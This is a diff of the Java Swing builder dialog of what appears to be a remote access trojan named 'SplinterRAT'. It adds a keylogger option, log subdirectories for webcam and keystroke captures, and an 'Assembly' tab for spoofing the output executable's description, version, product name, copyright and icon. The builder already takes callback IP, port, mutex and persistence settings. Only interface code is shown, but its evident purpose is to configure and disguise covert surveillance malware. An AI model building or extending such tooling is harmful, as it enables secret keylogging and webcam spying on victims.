@@ -1,9 +1,12 @@
 package GUI.Compiler;
 
 import javax.swing.*;
+import javax.swing.filechooser.FileNameExtensionFilter;
 
 import java.awt.*;
 
+import java.awt.event.FocusAdapter;
+import java.awt.event.FocusEvent;
 import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
@@ -18,9 +21,12 @@ public class CompilerGUI {
 
     private JCheckBox webcamCheckBox;
 
+    private JCheckBox keyloggerCheckBox;
+
     public CompilerGUI(JFrame parentFrame) {
         compilerDialog = new JDialog(parentFrame, "Compiler");
         compilerDialog.setModal(true);
+        compilerDialog.setResizable(false);
         compilerDialog.setSize(450, 275);
         compilerDialog.setLocationRelativeTo(null);
         compilerDialog.setLayout(new GridBagLayout());
@@ -33,7 +39,7 @@ public class CompilerGUI {
         tabPane = new JTabbedPane();
         addIdentificationPanel();
         addInstallationPanel();
-        addMonitorPanel();
+        addModulesPanel();
         addAssemblyPanel();
         addCompilePanel();
         constraints.gridx = 0;
@@ -134,8 +140,11 @@ public class CompilerGUI {
         compileButton.setCursor(handCursor);
         compileButton.setBackground(new Color(0, 136, 6));
         compileButton.addActionListener(new Compiler(compilerDialog,
-                new JCheckBox[]{installCheckBox, persistentClientCheckBox,webcamCheckBox},
-                new JTextField[]{ipField, portField, tagField, mutexField, timingField, compilerPathField,subdirectoryNameField,executableNameField,clientNameStartUp},radioGroup));
+                new JCheckBox[]{installCheckBox, persistentClientCheckBox,webcamCheckBox,keyloggerCheckBox},
+                new JTextField[]{ipField, portField, tagField, mutexField, timingField, compilerPathField,
+                        subdirectoryNameField,executableNameField,clientNameStartUp,subdirectoryWebcamLogsField,subdirectoryKeyloggerField,
+                        fileDescriptionField,fileVersionField,productNameField,copyrightField,originalNameField,iconPathField
+                },radioGroup));
         compileButton.setToolTipText("You must check the version you have " +
                 "installed on your system using the g++ check button");
         compileButton.setEnabled(false);
@@ -149,36 +158,161 @@ public class CompilerGUI {
         tabPane.add(compilePanel, "Compiler");
     }
 
+    private JTextField fileDescriptionField;
+    private JTextField fileVersionField;
+    private JTextField productNameField;
+    private JTextField copyrightField;
+    private JTextField originalNameField;
 
+    private JTextField iconPathField;
     private void addAssemblyPanel() {
         JPanel assemblyPanel = new JPanel();
         assemblyPanel.setLayout(null);
 
-        JLabel tagLabel = new JLabel("Assembly spec:");
-        tagLabel.setBounds(10, 10, 210, 20);
-        assemblyPanel.add(tagLabel);
+        JLabel fileDescriptionLabel = new JLabel("Description of file:");
+        fileDescriptionLabel.setBounds(69, 15, 150, 20);
+        assemblyPanel.add(fileDescriptionLabel);
+
+        fileDescriptionField = new JTextField("This program is so pretty!");
+        fileDescriptionField.setBounds(170, 15, 150, 20);
+        assemblyPanel.add(fileDescriptionField);
+
+        JLabel versionOfFileAndProduct = new JLabel("Version of file and product:");
+        versionOfFileAndProduct.setBounds(22, 45, 210, 20);
+        assemblyPanel.add(versionOfFileAndProduct);
+
+        fileVersionField = new JTextField("0.0.0.0");
+        fileVersionField.addFocusListener(new FocusAdapter() {
+            @Override
+            public void focusLost(FocusEvent e) {
+                fileVersionField.setText(
+                        fileVersionField.getText().matches("(\\d)|(\\d\\.\\d)|((\\d\\.){2}\\d)|((\\d\\.){3}\\d)")
+                        ? fileVersionField.getText() : "");
+            }
+        });
+        fileVersionField.setBounds(170, 45, 150, 20);
+        assemblyPanel.add(fileVersionField);
+
+        JLabel productNameLabel = new JLabel("Name of product:");
+        productNameLabel.setBounds(70, 75, 210, 20);
+        assemblyPanel.add(productNameLabel);
+
+        productNameField = new JTextField("Splinter client");
+        productNameField.setBounds(170, 75, 150, 20);
+        assemblyPanel.add(productNameField);
+
+
+        JLabel copyrightLabel = new JLabel("Copyright:");
+        copyrightLabel.setBounds(108, 105, 210, 20);
+        assemblyPanel.add(copyrightLabel);
+
+        copyrightField = new JTextField("SplinterRAT ©");
+        copyrightField.setBounds(170, 105, 150, 20);
+        assemblyPanel.add(copyrightField);
+
+        JLabel originalNameLabel = new JLabel("Original name of file:");
+        originalNameLabel.setBounds(54, 135, 210, 20);
+        assemblyPanel.add(originalNameLabel);
+
+        originalNameField = new JTextField("client.exe");
+        originalNameField.setBounds(170, 135, 150, 20);
+        assemblyPanel.add(originalNameField);
+
+        JButton iconButton = new JButton("Select icon");
+        iconButton.setBounds(325, 105, 100, 20);
+        assemblyPanel.add(iconButton);
+
+
+        iconPathField = new JTextField();
+        iconPathField.setEditable(false);
+        iconPathField.setBounds(325, 135, 100, 20);
+        assemblyPanel.add(iconPathField);
+
+        iconButton.addActionListener(e -> {
+            JFileChooser fileChooser = new JFileChooser();
+            fileChooser.setCurrentDirectory(new File(System.getProperty("user.home")));
+            fileChooser.setAcceptAllFileFilterUsed(false);
+            fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
+            fileChooser.setMultiSelectionEnabled(false);
+            fileChooser.addChoosableFileFilter(new FileNameExtensionFilter(".ico", "ico"));
+
+            int result = fileChooser.showOpenDialog(compilerDialog);
+
+            if (result == JFileChooser.APPROVE_OPTION) {
+                File selectedFile = fileChooser.getSelectedFile();
+                iconPathField.setText(selectedFile.getAbsolutePath());
+            }
+        });
+
+
         tabPane.add(assemblyPanel, "Assembly");
 
     }
+    private JTextField subdirectoryKeyloggerField;
+    private JTextField subdirectoryWebcamLogsField;
 
-
-    private void addMonitorPanel() {
+    private void addModulesPanel() {
         JPanel monitorPanel = new JPanel();
         monitorPanel.setLayout(null);
-        webcamCheckBox = new JCheckBox("Enable webcam monitoring");
+        webcamCheckBox = new JCheckBox("Webcam monitoring");
         webcamCheckBox.setBounds(10, 10, 210, 20);
         monitorPanel.add(webcamCheckBox);
 
-        JCheckBox keyloggerCheckBox = new JCheckBox("Enable keylogger monitoring");
-        keyloggerCheckBox.setBounds(10, 40, 210, 20);
+        JLabel subdirectoryWebcamLogsLabel = new JLabel("Subdirectory name:");
+        subdirectoryWebcamLogsLabel.setBounds(210, 10, 120, 20);
+        monitorPanel.add(subdirectoryWebcamLogsLabel);
+        subdirectoryWebcamLogsLabel.setEnabled(false);
+
+        JSeparator verticalSeparatorOne = new JSeparator(SwingConstants.VERTICAL);
+        verticalSeparatorOne.setBounds(180, 10, 5, 20);
+        monitorPanel.add(verticalSeparatorOne);
+
+        subdirectoryWebcamLogsField= new JTextField("WLogs");
+        subdirectoryWebcamLogsField.addFocusListener(new FieldListener(subdirectoryWebcamLogsField,"WLogs"));
+        subdirectoryWebcamLogsField.setBounds(320, 10, 100, 20);
+        monitorPanel.add(subdirectoryWebcamLogsField);
+        subdirectoryWebcamLogsField.setEnabled(false);
+
+        JSeparator horizontalSeparatorOne = new JSeparator(SwingConstants.HORIZONTAL);
+        horizontalSeparatorOne.setBounds(10, 40, 410, 5);
+        monitorPanel.add(horizontalSeparatorOne);
+
+        keyloggerCheckBox = new JCheckBox("Keylogger monitoring");
+        keyloggerCheckBox.setBounds(10, 50, 210, 20);
         monitorPanel.add(keyloggerCheckBox);
 
+        JLabel subdirectoryKeyloggerLogsLabel = new JLabel("Subdirectory name:");
+        subdirectoryKeyloggerLogsLabel.setBounds(210, 50, 120, 20);
+        monitorPanel.add(subdirectoryKeyloggerLogsLabel);
+        subdirectoryKeyloggerLogsLabel.setEnabled(false);
 
-        JSeparator lastHorizontalSeparator = new JSeparator();
-        lastHorizontalSeparator.setBounds(0, 170, 400, 5);
-        monitorPanel.add(lastHorizontalSeparator);
+        JSeparator verticalSeparatorTwo = new JSeparator(SwingConstants.VERTICAL);
+        verticalSeparatorTwo.setBounds(180, 50, 5, 20);
+        monitorPanel.add(verticalSeparatorTwo);
 
-        tabPane.add(monitorPanel, "Monitoring");
+        subdirectoryKeyloggerField= new JTextField("KLogs");
+        subdirectoryKeyloggerField.addFocusListener(new FieldListener(subdirectoryKeyloggerField,"KLogs"));
+        subdirectoryKeyloggerField.setBounds(320, 50, 100, 20);
+        monitorPanel.add(subdirectoryKeyloggerField);
+        subdirectoryKeyloggerField.setEnabled(false);
+
+
+        JSeparator horizontalSeparatorTwo = new JSeparator(SwingConstants.HORIZONTAL);
+        horizontalSeparatorTwo.setBounds(10, 80, 410, 5);
+        monitorPanel.add(horizontalSeparatorTwo);
+
+        List<JComponent>webcamComps = new ArrayList<>();
+        webcamComps.add(subdirectoryWebcamLogsLabel);
+        webcamComps.add(subdirectoryWebcamLogsField);
+
+        List<JComponent>keyloggerComps = new ArrayList<>();
+        keyloggerComps.add(subdirectoryKeyloggerLogsLabel);
+        keyloggerComps.add(subdirectoryKeyloggerField);
+
+        webcamCheckBox.addActionListener(e -> webcamComps.forEach((comp)-> comp.setEnabled(((AbstractButton)e.getSource()).getModel().isSelected())));
+        keyloggerCheckBox.addActionListener(e -> keyloggerComps.forEach((comp)-> comp.setEnabled(((AbstractButton)e.getSource()).getModel().isSelected())));
+
+        tabPane.add(monitorPanel, "Modules");
     }
 
     private JCheckBox installCheckBox;
